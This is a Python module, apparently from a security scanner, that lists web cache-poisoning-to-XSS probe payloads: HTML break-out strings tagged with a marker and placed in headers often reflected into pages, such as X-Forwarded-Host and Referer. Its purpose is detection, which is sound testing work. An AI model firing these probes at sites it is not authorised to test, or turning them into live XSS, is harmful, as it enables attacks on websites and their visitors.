#!/usr/bin/python3

"""
Curated "top" reflected Cache-Poisoning -> XSS payloads.

Unlike `top_payloads_errors` (which only tries to trigger error-based CPDoS),
this list carries actual XSS break-out payloads inside headers that are commonly
reflected *unencoded* into the HTML body (canonical links, base href, redirect
URLs, debug echoes, meta tags, ...). When such a header value is cached and
reflected verbatim, it turns a cache-poisoning primitive into a stored XSS.

Detection is based on the payload string being reflected *verbatim* in the
response body: because every payload keeps its raw `<`, `>` and `"` characters
next to the unique REFLECT_MARKER, a verbatim match means the value was NOT
HTML-encoded and is therefore executable in that context.

Each entry is a single-header dict `{header: payload}` so it plugs into the same
sending helpers as the rest of the arsenal.
"""

# Unique, low-false-positive marker embedded in every payload.
REFLECT_MARKER = "hexr3fl3ctxss"

# XSS break-out payloads for the main injection contexts.
# They all contain the marker + raw HTML metacharacters.
_P_ATTR_SVG = f'"><svg/>{REFLECT_MARKER}'          # attribute break-out
_P_ATTR_IMG = f'"><img src=x>{REFLECT_MARKER}'   # attribute break-out (no <script>)
_P_TAG_SCRIPT = f'</title><script></script>{REFLECT_MARKER}'  # element / text context
_P_SINGLE_QUOTE = f"'><svg/>{REFLECT_MARKER}"      # single-quoted attribute

# Headers frequently reflected into the HTML body (host/URL rewriting, debug
# echoes, canonical/redirect building, analytics, CDN geo, ...).
_REFLECTED_HEADERS = [
    "X-Forwarded-Host",
    "X-Forwarded-Server",
    "X-Forwarded-Scheme",
    "X-Forwarded-Proto",
    "X-Forwarded-Prefix",
    "X-Forwarded-Path",
    "X-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Original-Host",
    "Referer",
    "User-Agent",
    "Origin",
    "X-Api-Version",
    "True-Client-IP",
    "X-Real-IP",
    "Via",
    "X-Wap-Profile",
    "X-Forwarded-For",
]

# Attribute-context break-out (the most common: header echoed inside a
# double-quoted HTML attribute such as <link href="...">).
top_reflected_payloads = [{h: _P_ATTR_SVG} for h in _REFLECTED_HEADERS]

# A second, lighter pass with alternative contexts on the highest-signal headers.
_HIGH_SIGNAL = [
    "X-Forwarded-Host",
    "X-Forwarded-Scheme",
    "X-Forwarded-Prefix",
    "X-Host",
    "Referer",
    "User-Agent",
    "X-Original-URL",
]

top_reflected_payloads += [{h: _P_ATTR_IMG} for h in _HIGH_SIGNAL]
top_reflected_payloads += [{h: _P_TAG_SCRIPT} for h in _HIGH_SIGNAL]
top_reflected_payloads += [{h: _P_SINGLE_QUOTE} for h in _HIGH_SIGNAL]
